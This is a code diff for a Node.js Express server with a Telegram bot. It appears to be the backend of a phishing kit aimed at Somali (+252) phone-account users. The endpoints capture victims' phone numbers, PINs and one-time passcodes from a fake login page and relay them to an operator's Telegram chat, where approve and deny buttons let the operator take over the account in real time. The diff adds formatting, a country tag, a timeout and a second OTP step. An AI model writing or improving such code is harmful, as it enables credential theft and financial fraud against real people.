@@ -7,6 +7,10 @@ const app = express();
 const PORT = process.env.PORT || 8080;
 
 // -------------------- INIT BOT --------------------
+if (!process.env.BOT_TOKEN) {
+    throw new Error("BOT_TOKEN is missing in .env");
+}
+
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 
@@ -23,6 +27,11 @@ app.get('/', (req, res) => {
 });
 
 app.get('/:page', (req, res) => {
+    // prevent conflict with API routes
+    if (req.params.page.startsWith('api')) {
+        return res.status(404).send("Not found");
+    }
+
     const file = req.params.page.endsWith('.html')
         ? req.params.page
         : req.params.page + '.html';
@@ -36,7 +45,16 @@ app.get('/:page', (req, res) => {
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
 
+    const country = "Somalia";
+    const countryCode = "+252";
+
     const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric',
+        day: 'numeric',
+        year: 'numeric',
+        hour: 'numeric',
+        minute: 'numeric',
+        second: 'numeric',
         hour12: true
     });
 
@@ -47,22 +65,32 @@ app.post('/api/login-notification', async (req, res) => {
     statusStore[phone] = "pending";
 
     const message =
-        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
-        `🆕 NEW USER\n` +
-        `📱 Phone Number: ${phone}\n` +
-        `🔢 PIN: ${pin}\n` +
-        `⏰ Time: ${currentTime}\n\n` +
-        `⚠️ User waiting for approval`;
+        `📱 <b>CL 2 - LOGIN ATTEMPT</b>\n\n` +
+        `🆕 <b>NEW USER</b>\n` +
+        `🇸🇴 <b>Country:</b> ${country}\n` +
+        `🌍 <b>Country Code:</b> ${countryCode}\n` +
+        `📱 <b>Phone Number:</b> ${phone}\n` +
+        `🔢 <b>PIN:</b> ${pin}\n` +
+        `⏰ <b>Time:</b> ${currentTime}\n\n` +
+        `📱 <b>New user - will show 2 OTPs</b>\n` +
+        `━━━━━━━━━━━━━━━\n\n` +
+        `⚠️ <b>User waiting for approval</b>\n` +
+        `⌛ <b>Timeout: 5 minutes</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Approve", callback_data: `approve_${phone}_${pin}` }
-                    ],
-                    [
-                        { text: "❌ Deny", callback_data: `deny_${phone}` }
+                        {
+                            text: "✅ Approve",
+                            callback_data: `approve_${phone}_${pin}`
+                        },
+                        {
+                            text: "❌ Deny",
+                            callback_data: `deny_${phone}`
+                        }
                     ]
                 ]
             }
@@ -76,7 +104,7 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- OTP API --------------------
+// -------------------- FIRST OTP API --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
 
@@ -89,16 +117,20 @@ app.post('/api/verify-first-otp', async (req, res) => {
     }
 
     const otpMessage =
-        `1️⃣ FIRST OTP RECEIVED\n\n` +
-        `📱 Phone: ${phone}\n` +
-        `🔓 OTP: ${otp}\n` +
-        `⏰ Time: ${currentTime}`;
+        `1️⃣ <b>FIRST OTP RECEIVED</b>\n\n` +
+        `📱 <b>Phone:</b> ${phone}\n` +
+        `🔓 <b>OTP:</b> ${otp}\n` +
+        `⏰ <b>Time:</b> ${currentTime}`;
 
     try {
-        await bot.telegram.sendMessage(ADMIN_ID, otpMessage);
+        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
+            parse_mode: 'HTML'
+        });
+
         res.json({ success: true });
 
     } catch (err) {
+        console.error(err);
         res.status(500).json({ error: "Telegram error" });
     }
 });
@@ -111,12 +143,12 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     statusStore[phone] = "approved";
 
     const msg =
-        `✅ LOGIN APPROVED\n\n` +
-        `📱 ${phone}\n` +
-        `🔐 ${pin}`;
+        `✅ <b>LOGIN APPROVED</b>\n\n` +
+        `📱 <b>Phone:</b> ${phone}\n` +
+        `🔐 <b>PIN:</b> ${pin}`;
 
     try {
-        await ctx.editMessageText(msg);
+        await ctx.editMessageText(msg, { parse_mode: 'HTML' });
     } catch (e) {
         console.error(e.message);
     }
@@ -127,7 +159,9 @@ bot.action(/deny_(.+)/, async (ctx) => {
     statusStore[phone] = "denied";
 
     try {
-        await ctx.editMessageText("❌ LOGIN DENIED");
+        await ctx.editMessageText("❌ <b>LOGIN DENIED / INVALID INFO</b>", {
+            parse_mode: 'HTML'
+        });
     } catch (e) {
         console.error(e.message);
     }
